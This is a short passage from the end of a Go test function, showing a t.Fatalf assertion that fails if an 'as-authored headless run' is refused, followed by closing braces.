		t.Fatalf("an as-authored headless run was refused: %v", err)
	}
}
